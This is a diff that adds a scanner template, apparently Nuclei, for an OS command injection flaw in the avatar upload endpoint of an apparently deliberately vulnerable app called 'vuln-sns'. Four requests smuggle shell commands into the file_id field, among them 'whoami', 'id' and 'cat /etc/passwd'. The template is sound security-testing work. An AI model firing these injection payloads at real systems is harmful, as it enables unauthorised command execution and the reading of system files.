@@ -1,0 +1,116 @@
+id: vuln-sns-profile-command-injection
+
+info:
+  name: vuln-sns Profile OS Command Injection
+  author: devin
+  severity: critical
+  description: OS command injection vulnerability in avatar upload endpoint via file_id parameter
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.8
+    cwe-id: CWE-78
+  metadata:
+    max-request: 4
+  tags: command-injection,profile,vuln-sns,authenticated
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/profile/avatar"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer alice_token"
+    
+    body: |
+      {
+        "file_id": "test.jpg; ls -la",
+        "image_data": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
+      }
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "total"
+          - "drwx"
+          - "-rw-"
+          - "root"
+        condition: or
+        part: body
+      
+      - type: status
+        status:
+          - 500
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/profile/avatar"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer alice_token"
+    
+    body: |
+      {
+        "file_id": "test.jpg && whoami",
+        "image_data": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
+      }
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root"
+          - "www-data"
+          - "ubuntu"
+        condition: or
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/profile/avatar"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer alice_token"
+    
+    body: |
+      {
+        "file_id": "test.jpg | cat /etc/passwd",
+        "image_data": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
+      }
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "/bin/bash"
+          - "/bin/sh"
+        condition: or
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/profile/avatar"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer alice_token"
+    
+    body: |
+      {
+        "file_id": "test.jpg`id`",
+        "image_data": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
+      }
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+          - "groups="
+        condition: or
+        part: body
